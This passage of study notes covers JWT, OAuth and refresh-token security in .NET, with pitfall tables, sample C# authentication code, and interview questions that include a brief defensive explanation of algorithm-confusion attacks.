- **Dedicated token-type claim** (`"token_use":"access"`) so a refresh token can't replay as access.
- **Prefer scopes over embedded roles** when roles change often (role changes don't apply until expiry unless you add state checks).
- **Rotate signing keys** — multiple keys, `kid`, JWKS, keep old keys until their tokens expire.
- **Handle clock skew** 1–2 min. **Always HTTPS.** **Never tokens in query strings** (logs/history).
- **Rotate refresh tokens every use + detect reuse** (§3.8). **Revoke on logout + credential/password change.**
- **Rate-limit the refresh/token endpoint.**
- **Prefer policy-based authorization** over scattered role checks.
- **Store secrets in a managed store** (Key Vault, Secrets Manager) — never in committed `appsettings.json`.

---

## 6. Common Pitfalls

### 6.1 JWT Pitfalls
| Pitfall | Best Practice |
|---|---|
| Long expiry | 5–30 min + refresh tokens |
| No revocation strategy | Blacklist (Redis), refresh revocation, short lifetime |
| Insecure storage (localStorage) | HttpOnly Secure cookie or BFF |
| Large payloads | Only essential claims |
| Skipping validation (iss/aud/exp) | Always validate iss/aud/exp/nbf/signature |
| Weak signing keys | Strong secrets or RSA/ECDSA; rotate |
| Clock skew misconfig | 1–2 min tolerance |
| JWT in query string | Use Authorization header |
| No HTTPS | Enforce everywhere |
| Assuming JWT is encrypted | Treat payload as public; no secrets |

### 6.2 OAuth Pitfalls
| Pitfall | Best Practice |
|---|---|
| Implicit flow for SPAs | Authorization Code + PKCE |
| Wildcard redirect URI | Strict exact allow-listing |
| Client secret in frontend | Never embed; PKCE for public clients |
| Over-permissioned scopes | Least privilege |
| Missing API token validation | Validate iss/aud/exp/signature |
| No refresh rotation | Rotate every use |
| Poor revocation | Maintain a revocation mechanism |
| Confusing OAuth with authentication | OIDC for authN, OAuth for delegated authZ |

### 6.3 Refresh Token Pitfalls
| Pitfall | Best Practice |
|---|---|
| Insecure storage | HttpOnly Secure cookie; encrypt at rest |
| No rotation | Rotate every refresh |
| Long expiry (months) | 7–30 days; periodic re-login |
| Not bound to user/device | Bind to device/session fingerprint |
| No revocation on logout/password change | Revoke on both |
| Unlimited active tokens | Cap sessions; token inventory |
| No replay detection | Detect reuse → revoke whole family (§3.8) |
| Refresh endpoint not rate-limited | Rate limit + monitor |
| Sent via query string | Body or secure cookie only |
| No audit logging | Log + monitor anomalies |

---

## 7. Implementation Reference (C#)

Minimal .NET 8 JWT bearer setup (secrets inline for illustration only — **use a managed secret store in production**).

```json
// appsettings.json
{ "Jwt": { "Key": "SUPER_SECRET_KEY_12345", "Issuer": "MyCompany.Auth",
           "Audience": "MyCompany.Api", "ExpiryMinutes": 30 } }
```
```csharp
// Program.cs
var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options => {
        options.TokenValidationParameters = new TokenValidationParameters {
            ValidateIssuer = true, ValidateAudience = true, ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"], ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small deliberate skew, not TimeSpan.Zero
        };
    });
builder.Services.AddAuthorization();
builder.Services.AddControllers();
var app = builder.Build();
app.UseAuthentication();
app.UseAuthorization();
app.MapControllers();
app.Run();
```
```csharp
// Token generator service
public string GenerateToken(string userId, string email, string role)
{
    var jwtSettings = _config.GetSection("Jwt");
    var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);
    var claims = new List<Claim> {
        new(JwtRegisteredClaimNames.Sub, userId),
        new(ClaimTypes.Email, email),
        new(ClaimTypes.Role, role),
        new("token_use", "access") // prevents refresh/access confusion
    };
    var credentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);
    var token = new JwtSecurityToken(
        issuer: jwtSettings["Issuer"], audience: jwtSettings["Audience"], claims: claims,
        expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
        signingCredentials: credentials);
    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

**Dual-mode auth (cookie for browsers, header for Postman/mobile).** HttpOnly cookies (right for browser XSS) are invisible to non-browser clients, which use the `Authorization` header. Support both:
```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();
    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");
    Response.Cookies.Append("access_token", token, new CookieOptions {
        HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30) });        // browser
    return Ok(new { access_token = token });                 // Postman/mobile
}
```
```csharp
.AddJwtBearer(options => {
    options.Events = new JwtBearerEvents {
        OnMessageReceived = context => {
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
                context.Token = authHeader["Bearer ".Length..];        // priority 1: header
            else if (context.Request.Cookies.TryGetValue("access_token", out var cookieToken))
                context.Token = cookieToken;                            // priority 2: cookie
            return Task.CompletedTask;
        }
    };
});
```
```csharp
[Authorize][HttpGet("orders")] public IActionResult GetOrders() => Ok("Secure Data");
```

**Production checklist:** HTTPS enforced; CORS allows credentials for cookie flow; `SameSite` Strict/Lax same-domain, `None; Secure` cross-domain SPA; CSRF protection whenever cookies used; access token 10–30 min + refresh for seamless re-auth.

**Refresh endpoint (with rotation + reuse detection):**
```csharp
[HttpPost("refresh")]
public IActionResult RefreshToken(RefreshRequest request)
{
    var savedToken = _refreshTokenStore.Get(request.RefreshToken);
    if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed) {
        if (savedToken?.IsConsumed == true)                 // reuse of rotated token → theft
            _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
        return Unauthorized();
    }
    var newAccessToken = _jwtService.GenerateToken(savedToken.UserId, savedToken.Email, savedToken.Role);
    var newRefreshToken = Guid.NewGuid().ToString();
    _refreshTokenStore.MarkConsumedAndIssueNext(request.RefreshToken, newRefreshToken);
    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });
}
```
```csharp
// Policy-based authorization
builder.Services.AddAuthorization(o => o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));
[Authorize(Policy = "ITOnly")] public IActionResult InternalData() => Ok();
```

---

## 8. Sample Interview Q&A

**Q1. How does JWT validation work internally?** Extract token (header/cookie) → select key (by `kid` from trusted JWKS if asymmetric) → verify signature with a *server-configured* algorithm (never the token's `alg`) → validate `exp`/`nbf`/`iss`/`aud` with small skew → claims into `HttpContext.User` → then authorize. Reject on any failure.

**Q2. AuthN vs AuthZ?** AuthN = "who are you" (login; validates identity) → 401 on failure. AuthZ = "what can you do" (claims/roles/policies vs resource) → 403 on failure.

**Q3. Why is Basic Auth insecure?** Creds on every request, Base64 is encoding not encryption, no expiry/revocation, replayable. Legacy/internal only, always over HTTPS.

**Q4. How do you revoke JWTs?** Not native (stateless) — add state: short-lived access (primary), `jti` blacklist in Redis, token versioning, refresh revocation, or key rotation (nuclear). Each trades away statelessness.

**Q5. JWT vs OAuth?** JWT = token *format*; OAuth 2.0 = authorization *framework*. OAuth often uses JWT as its token format, but they solve different problems.

**Q6. When Windows Authentication?** Internal enterprise apps in an AD domain needing SSO; not for public internet APIs (no external clients, ties to Kerberos/NTLM).

**Q7. How to secure microservices comms?** JWT between services (service-specific `aud`), mTLS for transport identity, gateway-level validation, network isolation — combined (mTLS + JWT), not either/or (§4.5).

**Q8. Claims vs Roles — which is better?** Claims = fine-grained/scalable; roles = coarse, multiply combinatorially. Production default: policy-based authorization built from claims (and roles where apt) — centralizes decision logic.

**Q9. How to handle token expiration?** Short-lived access + refresh flow + silent refresh on the frontend (interceptor) so no re-login interruption.

**Q10. How to prevent token replay?** HTTPS everywhere, short lifetime, key rotation, device binding where feasible, nonce/idempotency-key for critical ops (payments) regardless of token validity.

**Q11. Why PKCE even for confidential clients?** Designed for public clients, but also defends against code interception at the redirect step for any client; universal use simplifies config with no operational cost (§3.3).

**Q12. Walk through an algorithm confusion attack.** Server verifies RS256 with a public key but library also accepts HS256 via the same key path → attacker crafts an HS256 token using the public RSA key bytes as the HMAC secret → server accepts. Fix: pin algorithm(s), never trust the token's `alg`, never share key material across paths (§4.3).

**Q13. What is the BFF pattern and why over token-in-browser?** SPA holds only a session cookie with its backend; the backend does the OAuth dance server-side and never exposes a token to the browser. Removes the "where to store a token in JS" problem, at the cost of an extra backend (§3.9).

**Q14. How would you design refresh token reuse detection?** Mark each token "consumed" (not deleted). If a consumed token reappears → theft signal → revoke the whole family, forcing re-auth. Logs out the legit user too — the safer failure mode (§3.8).

---

## Notes on Consolidation

- **Access token lifetime** varies by source section (5–15 / 5–30 / 10–30 min). Conservative guidance: 5–30 min, preferring the 5–15 tighter end; real systems vary by risk tolerance.
- **Clock skew:** use `TimeSpan.FromMinutes(2)`, not `TimeSpan.Zero` — zero causes the "random clock-skew auth failures" pitfall the notes warn about.
